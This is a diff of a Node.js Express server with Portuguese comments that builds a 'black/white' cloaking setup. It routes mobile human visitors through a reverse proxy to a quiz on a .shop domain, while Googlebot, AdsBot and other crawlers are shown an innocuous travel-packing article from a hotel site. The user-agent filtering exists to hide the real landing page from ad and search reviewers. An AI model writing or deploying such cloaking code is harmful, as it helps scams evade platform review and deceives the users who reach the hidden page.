@@ -1,44 +1,48 @@
 const express = require('express');
 const path = require('path');
-const { createProxyMiddleware } = require('http-proxy-middleware');
-
 const app = express();
-
-// Define o diretório de arquivos estáticos (public)
+const { createProxyMiddleware } = require('http-proxy-middleware');
+// Define o diretório de arquivos estáticos
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Rota padrão para servir o index.html localmente
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
 
-// Configuração do proxy reverso para a página white (externa)
-const proxyOptionsWhite = {
-    target: 'https://www.megamodahotel.com.br/cultura/como-arrumar-uma-mala-de-viagem-feminina/',
+// Configuração do proxy reverso para o quiz local (proxy black)
+
+const proxyOptionsBlack = {
+    target: 'https://bagagemrio.aniversarioricardo.shop/quiz',  // Substitua pelo URL da sua aplicação em produção
     changeOrigin: true,  // Mudar o cabeçalho Host para o host do destino
-    secure: true  // Habilitar verificação SSL
+    pathRewrite: {
+        '^/quiz': '/index.html'  // Redireciona requisições para /quiz para /index.html dentro de /public
+    },
+    secure: true  // Habilitar verificação SSL se seu aplicativo usar HTTPS
 };
 
-// Criar o middleware do proxy reverso baseado nas opções acima
+// Configuração do proxy reverso para a página white
+const proxyOptionsWhite = {
+  target: 'https://www.megamodahotel.com.br/cultura/como-arrumar-uma-mala-de-viagem-feminina/',  // URL da página white
+  changeOrigin: true,  // Mudar o cabeçalho Host para o host do destino
+  secure: true  // Habilitar verificação SSL
+};
+
+// Criar o middleware do proxy baseado nas opções acima
+const proxyBlack = createProxyMiddleware(proxyOptionsBlack);
 const proxyWhite = createProxyMiddleware(proxyOptionsWhite);
 
-// Middleware para determinar qual página servir
+// Middleware para determinar qual proxy usar
 app.use((req, res, next) => {
-    const userAgent = req.headers['user-agent'].toLowerCase();
-    const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
-    const isBot = /googlebot|bingbot|yandexbot|duckduckbot|baiduspider|sogou|exabot|msnbot|teoma|slurp/i.test(userAgent);
-    const isGoogleBot = /googlebot|googlebot-image|googlebot-video|googlebot-mobile|adsbot-google(?:-mobile)?|mediapartners-google/i.test(userAgent);
+  const userAgent = req.headers['user-agent'].toLowerCase();
+  const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
+  const isBot = /googlebot|bingbot|yandexbot|duckduckbot|baiduspider|sogou|exabot|msnbot|teoma|slurp/i.test(userAgent);
+  const isGoogleBot = /googlebot|googlebot-image|googlebot-video|googlebot-mobile|adsbot-google(?:-mobile)?|mediapartners-google/i.test(userAgent);
 
-    // Decida qual página servir com base no agente do usuário
-    if (!isBot && !isGoogleBot && isMobile) {
-        res.sendFile(path.join(__dirname, 'public', 'index.html'));
 
-                // Servir o quiz local (index.html)
-    } else {
-        proxyWhite(req, res, next);
+  // Definir uma propriedade customizada no request para indicar qual proxy usar
+  if (!isBot && !isGoogleBot && isMobile) {
+    return proxyBlack(req, res, next); // Encaminha a requisição para o proxy da página black  } else {
+  } else {
+    return proxyWhite(req, res, next); // Encaminha para a página white se não atender aos critérios
+  }
 
-        // Encaminha a requisição para o proxy da página white (externa)
-    }
 });
 
 // Porta do servidor
